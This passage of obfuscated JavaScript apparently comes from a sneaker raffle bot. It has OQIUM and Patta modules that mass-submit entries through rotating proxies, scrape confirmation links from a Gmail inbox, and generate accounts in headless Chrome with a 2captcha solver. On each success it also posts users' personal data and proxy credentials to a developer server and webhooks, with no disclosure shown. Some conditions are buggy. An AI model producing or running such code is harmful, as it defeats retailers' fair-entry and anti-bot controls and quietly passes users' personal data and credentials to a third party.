                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x220a3e, _0x52bcb5, _0x1d51e3) {
                    for (var _0x4d90be = 0x0; _0x4d90be < _0x52bcb5['length']; _0x4d90be++) {
                        try {
                            await _0xf6702b(_0x52bcb5, _0x4d90be);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x46035a(_0x160a51, _0x3f8986, _0x3d6fb2, _0x121176, _0x40ffa3) {
                            var _0x16ff69, _0x230df4 = {}, _0x2e7a16 = [], _0x5dd4e9 = {}, _0x325156 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x1041f5 = Math['round'](Math['random']() * (_0x325156['length'] - 0x1));
                            !_0x121176 && (_0x121176 = {});
                            if (_0x3f8986 != 'ver') {
                                _0x3e9ae7(_0x3d6fb2['name'] + '\x20Task\x20' + (_0x160a51 + 0x1) + '\x20/\x20' + _0x121176['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9), _0x2e7a16 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x1c4b49
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x121176[_0x160a51]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x1940dd['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x233a0d
                                        }
                                    ]
                                }], _0x5dd4e9 = { 'embeds': _0x2e7a16 }, _0x230df4 = _0x3d6fb2['data'], _0x230df4['data']['attributes']['email'] = '' + _0x121176[_0x160a51]['Email'];
                                if (_0x121176[_0x160a51]['Size'] == 'RANDOM') {
                                }
                                _0x230df4['data']['attributes']['properties']['$first_name'] = '' + _0x121176[_0x160a51]['FirstName'], _0x230df4['data']['attributes']['properties']['$last_name'] = '' + _0x121176[_0x160a51]['LastName'], _0x230df4['data']['attributes']['properties']['$address1'] = _0x121176[_0x160a51]['Address1'] + '\x20' + _0x121176[_0x160a51]['Address2'] + '\x20' + _0x121176[_0x160a51]['HouseNumber'], _0x230df4['data']['attributes']['properties']['$zip'] = '' + _0x121176[_0x160a51]['Zip'], _0x230df4['data']['attributes']['properties']['$city'] = '' + _0x121176[_0x160a51]['City'], _0x230df4['data']['attributes']['properties']['$country'] = '' + _0x121176[_0x160a51]['Country'], _0x121176[_0x160a51]['Size'] == 'RANDOM' ? _0x230df4['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x325156[_0x1041f5] : _0x230df4['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x121176[_0x160a51]['Size'], _0x230df4['data']['attributes']['properties']['$phone_number'] = '' + _0x121176[_0x160a51]['Phone'], _0x230df4['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x121176[_0x160a51]['Follower'];
                            }
                            if (_0x1940dd['useRandomProxy'] = ![])
                                var _0x540ca0 = _0x40ffa3[_0x160a51]['split'](':');
                            else
                                var _0x11aec3 = Math['round'](Math['random']() * (_0x40ffa3['length'] - 0x1)), _0x540ca0 = _0x40ffa3[_0x11aec3]['split'](':');
                            var _0x4ae04a = {
                                'jar': _0x4cd5d1,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x3d6fb2['url'],
                                'headers': _0x3d6fb2['headers'],
                                'body': JSON['stringify'](_0x230df4),
                                'proxy': 'http://' + _0x540ca0[0x2] + ':' + _0x540ca0[0x3] + '@' + _0x540ca0[0x0] + ':' + _0x540ca0[0x1]
                            };
                            return _0x3f8986 != 'ver' && (_0x4ae04a['url'] = _0x3d6fb2['url'], _0x4ae04a['headers'] = _0x3d6fb2['headers']), _0x3f8986 == 'ver' && (_0x4ae04a['method'] = 'GET'), new Promise(function (_0x1b74c1, _0x549cdb) {
                                callback = async (_0x48305b, _0xe926f3, _0x284577) => {
                                    if (!_0x48305b && _0xe926f3['statusCode'] == 0xca || !_0x48305b && _0xe926f3['statusCode'] == 0xc8) {
                                        if (_0x3f8986 != 'ver') {
                                            var _0x2b757c = await _0x22cd2f(_0x121176[_0x160a51], _0x3d6fb2, 'dev', ![]), _0x14d024 = await _0x22cd2f(_0x121176[_0x160a51], _0x3d6fb2, 'pub', ![]);
                                            const _0xbcc0e5 = {
                                                'succesDEVMSG': { 'embeds': [_0x2b757c] },
                                                'succesPUBMSG': { 'embeds': [_0x14d024] }
                                            };
                                            let _0x39a412 = _0x121176[_0x160a51];
                                            try {
                                                prxdata = {
                                                    'username': _0x1c4b49['replace']('#', ''),
                                                    'module': _0x3d6fb2['name'],
                                                    'entrydata': JSON['stringify'](_0x39a412),
                                                    'proxy': '' + _0x40ffa3[_0x160a51]
                                                };
                                                var _0x2316ee = JSON['stringify'](prxdata);
                                                let _0x2950d3 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x12ee7a['post']('https://jraffles.herokuapp.com/success', _0x2316ee, _0x2950d3);
                                            } catch (_0x2630dd) {
                                            }
                                            if (_0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '')
                                                try {
                                                    await _0x58a176(_0x1940dd['webhook'], _0xbcc0e5['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0xbcc0e5['succesDEVMSG']), await _0xf09eb2(0xc8);
                                            try {
                                                await _0x58a176(_0x443f6, _0xbcc0e5['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x3ed4cd(_0x121176[_0x160a51], _0x3d6fb2);
                                        }
                                        _0x1b74c1(console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x3d6fb2['name'] + ']\x20Task\x20' + (_0x160a51 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x3f8986 != 'ver') {
                                            var _0x3b671d = '' + _0x48305b, _0x48de9d = await _0x22cd2f(_0x121176[_0x160a51], _0x3d6fb2, 'dev', !![], _0x3b671d), _0x4738bc = {};
                                            _0x4738bc['errorDEV'] = { 'embeds': [_0x48de9d] }, _0x3f94a0(_0x121176[_0x160a51], _0x3d6fb2), _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x4738bc['errorDEV']), await _0x58a176(_0x45f55a, _0x4738bc['errorDEV']);
                                        }
                                        _0x549cdb(console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x3d6fb2['name'] + ']\x20Task\x20' + (_0x160a51 + 0x1) + ':\x20' + _0x48305b)));
                                    }
                                };
                                try {
                                    _0x3f8986 != 'ver' && console['log'](_0x1fc391() + '\x20[' + _0x3d6fb2['name'] + ']\x20Task\x20' + (_0x160a51 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x230df4['data']['attributes']['email']), _0x31fe1f(_0x4ae04a, callback);
                                } catch (_0x363848) {
                                    console['log'](_0x1fc391() + '\x20Task\x20' + (_0x160a51 + 0x1) + ':\x20' + _0x363848);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x46035a(_0x4d90be, 'nor', _0x220a3e, _0x52bcb5, _0x1d51e3), console['log'](_0x1fc391() + '\x20[' + _0x220a3e['name'] + ']\x20Sleeping\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                        } catch (_0x42a957) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x3c7d75, _0x5b8bd6, _0xb78a2c) {
                    var _0x5b8bd6 = [], _0x13b182 = ![];
                    async function _0x21bb17() {
                        var _0x92c820 = new _0x533159({
                            'user': _0x1940dd['masterMail'],
                            'password': _0x1940dd['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2d4baa(_0x10d5f9) {
                            _0x92c820['openBox']('INBOX', ![], _0x10d5f9);
                        }
                        _0x92c820['once']('ready', function () {
                            _0x2d4baa(function (_0x444cb3, _0x3f91fc) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x444cb3)
                                    throw _0x444cb3;
                                _0x92c820['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x2f9fb7, _0x48013c) {
                                    if (!_0x48013c || !_0x48013c['length'])
                                        console['log'](_0x1fc391() + '\x20[' + _0x3c7d75['name'] + ']\x20No\x20mails\x20found'), _0x92c820['end']();
                                    else {
                                        var _0x2c6bea = _0x92c820['seq']['fetch'](_0x48013c, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2c6bea['on']('message', function (_0x5996df, _0x225e07) {
                                            var _0x4faf43 = '(#' + _0x225e07 + ')\x20';
                                            _0x5996df['on']('body', function (_0x54a498, _0x2a6618) {
                                                _0x6212d5(_0x54a498, (_0x7b25df, _0xfe1cec) => {
                                                    var _0x131d60 = _0xfe1cec['text']['split']('(')[0x1], _0x562bdd = _0x131d60['split'](')')[0x0];
                                                    _0x5b8bd6['push'](_0x562bdd);
                                                });
                                            }), _0x5996df['once']('end', function () {
                                            });
                                        }), _0x2c6bea['once']('error', function (_0xc80a83) {
                                            console['log']('Fetch\x20error:\x20' + _0xc80a83), _0x13b182 = !![];
                                        }), _0x2c6bea['once']('end', function () {
                                            _0x92c820['end'](), _0x13b182 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x92c820['once']('error', function (_0x58fa37) {
                            console['log'](_0x58fa37), _0x13b182 = !![];
                        }), _0x92c820['once']('end', async function () {
                            _0x13b182 = !![];
                        }), _0x92c820['connect']();
                    }
                    async function _0x560790(_0x46edec, _0x28b626, _0x360fd6) {
                        for (var _0x2b016c = 0x0; _0x2b016c < _0x28b626['length']; _0x2b016c++) {
                            async function _0x11ad2c(_0x2ffbb2, _0x517292, _0x3a4eca, _0x47137c, _0x31db39) {
                                var _0x5a5aad, _0x44f68 = {}, _0x350fe4 = [], _0x5e2043 = {}, _0x52b793 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x2cd3b2 = Math['round'](Math['random']() * (_0x52b793['length'] - 0x1));
                                _0x47137c[_0x2ffbb2]['Size'] == 'RANDOM' && (_0x47137c[_0x2ffbb2]['Size'] = _0x52b793[_0x2cd3b2]);
                                !_0x47137c && (_0x47137c = {});
                                if (_0x1940dd['useRandomProxy'] = ![])
                                    var _0xf6ac87 = _0x31db39[_0x2ffbb2]['split'](':');
                                else
                                    var _0x4a635b = Math['round'](Math['random']() * (_0x31db39['length'] - 0x1)), _0xf6ac87 = _0x31db39[_0x4a635b]['split'](':');
                                var _0x46c422 = {
                                    'jar': _0x4cd5d1,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x3a4eca['url'],
                                    'headers': _0x3a4eca['headers'],
                                    'body': JSON['stringify'](_0x44f68),
                                    'proxy': 'http://' + _0xf6ac87[0x2] + ':' + _0xf6ac87[0x3] + '@' + _0xf6ac87[0x0] + ':' + _0xf6ac87[0x1]
                                };
                                return _0x517292 != 'ver' && (_0x46c422['url'] = _0x3a4eca['url'], _0x46c422['headers'] = _0x3a4eca['headers']), _0x517292 == 'ver' && (_0x46c422['method'] = 'GET', _0x46c422['url'] = _0x47137c[_0x2ffbb2]), new Promise(function (_0x19c79b, _0x39ebaf) {
                                    callback = async (_0x24183a, _0x2d3110, _0x39a7d3) => {
                                        if (!_0x24183a && _0x2d3110['statusCode'] == 0xca || !_0x24183a && _0x2d3110['statusCode'] == 0xc8) {
                                            if (_0x517292 != 'ver') {
                                                var _0x2c91cb = await _0x22cd2f(_0x47137c[_0x2ffbb2], _0x3a4eca, 'dev', ![]), _0x12e542 = await _0x22cd2f(_0x47137c[_0x2ffbb2], _0x3a4eca, 'pub', ![]);
                                                const _0x288a7e = {
                                                    'succesDEVMSG': { 'embeds': [_0x2c91cb] },
                                                    'succesPUBMSG': { 'embeds': [_0x12e542] }
                                                };
                                                if (_0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '')
                                                    try {
                                                        await _0x58a176(_0x1940dd['webhook'], _0x288a7e['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xf09eb2(0xc8), await _0x58a176(_0x2faedb, _0x288a7e['succesDEVMSG']), await _0xf09eb2(0xc8);
                                                try {
                                                    await _0x58a176(_0x443f6, _0x288a7e['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3ed4cd(_0x47137c[_0x2ffbb2], _0x3a4eca);
                                            }
                                            _0x19c79b(console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x3a4eca['name'] + ']\x20Task\x20' + (_0x2ffbb2 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x517292 != 'ver') {
                                                var _0x38246b = '' + _0x24183a, _0x187ed2 = await _0x22cd2f(_0x47137c[_0x2ffbb2], _0x3a4eca, 'dev', !![], _0x38246b), _0x2a8669 = {};
                                                _0x2a8669['errorDEV'] = { 'embeds': [_0x187ed2] }, _0x3f94a0(_0x47137c[_0x2ffbb2], _0x3a4eca), _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x2a8669['errorDEV']), await _0x58a176(_0x45f55a, _0x2a8669['errorDEV']);
                                            }
                                            _0x39ebaf(console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x3a4eca['name'] + ']\x20Task\x20' + (_0x2ffbb2 + 0x1) + ':\x20' + _0x24183a)));
                                        }
                                    };
                                    try {
                                        _0x517292 != 'ver' ? console['log'](_0x1fc391() + '\x20[' + _0x3a4eca['name'] + ']\x20Task\x20' + (_0x2ffbb2 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x44f68['data']['attributes']['email']) : console['log'](_0x1fc391() + '\x20[' + _0x3a4eca['name'] + ']\x20Task\x20' + (_0x2ffbb2 + 0x1) + ':\x20Fetching\x20Response'), _0x31fe1f(_0x46c422, callback);
                                    } catch (_0x507c9a) {
                                        console['log'](_0x1fc391() + '\x20Task\x20' + (_0x2ffbb2 + 0x1) + ':\x20' + _0x507c9a);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x11ad2c(_0x2b016c, 'ver', _0x46edec, _0x28b626, _0x360fd6), console['log'](_0x1fc391() + '\x20[' + _0x46edec['name'] + ']\x20Sleeping\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                            } catch (_0x8dac04) {
                            }
                        }
                    }
                    try {
                        _0x21bb17();
                        while (!_0x13b182) {
                            await _0xf09eb2(0xfa0);
                        }
                        console['log']('Found\x20' + _0x5b8bd6['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x560790(_0x3c7d75, _0x5b8bd6, _0xb78a2c);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x47d563, _0x25ec6d, _0x28e7f4) {
                    _0x43efe1['use'](_0x2180a5()), _0x43efe1['use'](_0x46c0dc({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1940dd['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1c25af = 0x0; _0x1c25af < _0x25ec6d['length']; _0x1c25af++) {
                        var _0x24686a = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1c4b49
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x1940dd['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x233a0d
                                }
                            ]
                        }];
                        const _0x22f320 = { 'embeds': _0x24686a };
                        _0x3e9ae7(_0x47d563['name'] + '\x20Task\x20' + (_0x1c25af + 0x1) + '\x20/\x20' + _0x25ec6d['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9);
                        try {
                            await _0xf6702b(_0x25ec6d, _0x1c25af);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x54b490 = await _0x22cd2f(_0x25ec6d[_0x1c25af], _0x47d563, 'acc', ![]);
                        const _0x4c716d = { 'succesDEVMSG': { 'embeds': [_0x54b490] } };
                        if (_0x25ec6d[_0x1c25af]['Email'] == '' || _0x25ec6d[_0x1c25af]['FirstName'] == '' || _0x25ec6d[_0x1c25af]['LastName'] == '') {
                            console['log'](_0x1fc391() + '\x20[' + _0xa96df6[taskModule]['name'] + ']\x20Task\x20' + (_0x1c25af + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xf09eb2(0x7d0);
                            continue;
                        }
                        (_0x25ec6d[_0x1c25af]['Password'] == '' || _0x25ec6d[_0x1c25af] == undefined) && _0x25ec6d[_0x1c25af]['Password'] == 'JRaffles23!';
                        if (_0x1940dd['useRandomProxy'] = ![])
                            var _0x349953 = _0x28e7f4[_0x1c25af]['split'](':');
                        else
                            var _0x4c2357 = Math['round'](Math['random']() * (_0x28e7f4['length'] - 0x1)), _0x349953 = _0x28e7f4[_0x4c2357]['split'](':');
                        var _0x52de6b;
                        try {
                            _0x52de6b = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x349953[0x0] + ':' + _0x349953[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x52de6b = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x349953[0x0] + ':' + _0x349953[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1ee169 = await _0x52de6b['newPage']();
                            await _0x1ee169['authenticate']({
                                'username': '' + _0x349953[0x2],
                                'password': '' + _0x349953[0x3]
                            }), console['log'](_0x1fc391() + '\x20[' + _0x47d563['name'] + ']\x20Task\x20' + (_0x1c25af + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1ee169['setRequestInterception'](!![]), _0x1ee169['on']('request', _0x524374 => {
                                _0x524374['resourceType']() === 'image' || _0x524374['resourceType']() === 'font' || _0x524374['resourceType']() === 'media' ? _0x524374['abort']() : _0x524374['continue']();
                            }), await _0x1ee169['goto']('https://patta.nl/account/register'), await _0xf09eb2(0xbb8), await _0x1ee169['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x1fc391() + '\x20[' + _0x47d563['name'] + ']\x20Task\x20' + (_0x1c25af + 0x1) + '\x20:\x20Filling\x20information'), await _0x1ee169['type']('#RegisterForm-FirstName', '' + _0x25ec6d[_0x1c25af]['FirstName']), await _0xf09eb2(0x226), await _0x1ee169['type']('#RegisterForm-LastName', '' + _0x25ec6d[_0x1c25af]['LastName']), await _0xf09eb2(0x226), await _0x1ee169['type']('#RegisterForm-email', '' + _0x25ec6d[_0x1c25af]['Email']), await _0xf09eb2(0x226), await _0x1ee169['type']('#RegisterForm-password', '' + _0x25ec6d[_0x1c25af]['Password']), await _0xf09eb2(0x226), console['log'](_0x1fc391() + '\x20[' + _0x47d563['name'] + ']\x20Task\x20' + (_0x1c25af + 0x1) + '\x20:\x20Submitting..'), await _0x1ee169['$eval']('#RegisterForm', _0x3ef9f3 => _0x3ef9f3['submit']()), await _0xf09eb2(0x1f40);
                            try {
                                await _0x1ee169['waitForSelector']('.home-page-grid__collection'), await _0xf09eb2(0x1f4), console['log'](_0x4f1d86['green'](_0x1fc391() + '\x20[' + _0x47d563['name'] + ']\x20Task\x20' + (_0x1c25af + 0x1) + '\x20:\x20Account\x20' + _0x25ec6d[_0x1c25af]['Email'] + '\x20Generated!')), _0x4b4581['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x25ec6d[_0x1c25af]['Email'] + ',' + _0x25ec6d[_0x1c25af]['Password']), console['log'](_0x4f1d86['yellow'](_0x1fc391() + '\x20[' + _0x47d563['name'] + ']\x20Task\x20' + (_0x1c25af + 0x1) + '\x20:\x20Account\x20' + _0x25ec6d[_0x1c25af]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x1940dd['webhook'] != undefined && _0x1940dd['webhook'] != '' && await _0x58a176(_0x1940dd['webhook'], _0x4c716d['succesDEVMSG']);
                                } catch {
                                }
                                await _0x58a176(_0x4ebcdb, _0x4c716d['succesDEVMSG']);
                            } catch (_0x31c599) {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0xa96df6[taskModule]['name'] + ']\x20Task\x20' + (_0x1c25af + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x31c599));
                            }
                        } catch (_0x3a460c) {
                            console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0xa96df6[taskModule]['name'] + ']\x20Task\x20' + (_0x1c25af + 0x1) + '\x20:\x20' + _0x3a460c));
                        } finally {
                            _0x52de6b && _0x52de6b['close'](), console['log']('Waiting\x20for\x20' + _0x1940dd['delay'] + '\x20ms'), await _0xf09eb2(_0x1940dd['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x290c27, _0x42245e, _0x9cf5f5) {
                    _0x43efe1['use'](_0x2180a5()), _0x43efe1['use'](_0x46c0dc({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1940dd['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x335920 = 0x0; _0x335920 < _0x42245e['length']; _0x335920++) {
                        var _0x450569;
                        if (_0x1778e7 != 'yes')
                            var _0x1778e7 = '', _0x4f3a72 = 0x0;
                        _0x3e9ae7(_0x290c27['name'] + '\x20Task\x20' + (_0x335920 + 0x1) + '\x20/\x20' + _0x42245e['length'] + '\x20||\x20File:\x20' + _0x5237bc + '\x20Proxies:\x20' + _0x3c7bd9);
                        try {
                            await _0xf6702b(_0x42245e, _0x335920);
                        } catch {
                            _0x1778e7 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x42245e[_0x335920]['Email'] == '' || _0x42245e[_0x335920]['Password'] == '' || _0x42245e[_0x335920]['FirstName'] == '' || _0x42245e[_0x335920]['LastName'] == '') {
                            console['log'](_0x1fc391() + '\x20[' + _0xa96df6[taskModule]['name'] + ']\x20Task\x20' + (_0x335920 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x1940dd['useRandomProxy'] = ![])
                            var _0x268ba = _0x9cf5f5[_0x335920]['split'](':');
                        else
                            var _0xe7cc3c = Math['round'](Math['random']() * (_0x9cf5f5['length'] - 0x1)), _0x268ba = _0x9cf5f5[_0xe7cc3c]['split'](':');
                        var _0x419887;
                        try {
                            _0x419887 = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x268ba[0x0] + ':' + _0x268ba[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x419887 = await _0x43efe1['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x268ba[0x0] + ':' + _0x268ba[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x367140 = await _0x419887['newPage']();
                            await _0x367140['authenticate']({
                                'username': '' + _0x268ba[0x2],
                                'password': '' + _0x268ba[0x3]
                            }), console['log'](_0x1fc391() + '\x20[' + _0x290c27['name'] + ']\x20Task\x20' + (_0x335920 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x367140['setRequestInterception'](!![]), _0x367140['on']('request', _0x2b2f95 => {
                                _0x2b2f95['resourceType']() === 'image' || _0x2b2f95['resourceType']() === 'font' || _0x2b2f95['resourceType']() === 'media' ? _0x2b2f95['abort']() : _0x2b2f95['continue']();
                            }), await _0x367140['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x367140['waitForSelector']('#CustomerEmail'), console['log'](_0x1fc391() + '\x20[' + _0x290c27['name'] + ']\x20Task\x20' + (_0x335920 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x367140['type']('#CustomerEmail', '' + _0x42245e[_0x335920]['Email']), await _0xf09eb2(0x12c), await _0x367140['type']('#CustomerPassword', '' + _0x42245e[_0x335920]['Password']), await _0xf09eb2(0x226), await _0x367140['$eval']('#customer_login', _0x28ec6b => _0x28ec6b['submit']());
                            try {
                                await _0x367140['waitForSelector']('#orders'), await _0xf09eb2(0x4b0);
                            } catch {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x290c27['name'] + ']\x20Task\x20' + (_0x335920 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x367140['goto']('' + _0x42245e[_0x335920]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xf09eb2(0xbb8), console['log'](_0x1fc391() + '\x20[' + _0x290c27['name'] + ']\x20Task\x20' + (_0x335920 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x367140['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x4f1d86['red'](_0x1fc391() + '\x20[' + _0x290c27['name'] + ']\x20Task\x20' + (_0x335920 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x367140['type']('#email', '' + _0x42245e[_0x335920]['Email']), await _0xf09eb2(0x384), await _0x367140['type']('#first_name', '' + _0x42245e[_0x335920]['FirstName']), await _0xf09eb2(0x514), await _0x367140['type']('#last_name', '' + _0x42245e[_0x335920]['LastName']), await _0xf09eb2(0x514), await _0x367140['type']('#street_address', _0x42245e[_0x335920]['Address1'] + '\x20' + _0x42245e[_0x335920]['HouseNumber'] + '\x20' + _0x42245e[_0x335920]['Address2']), await _0xf09eb2(0x2bc);
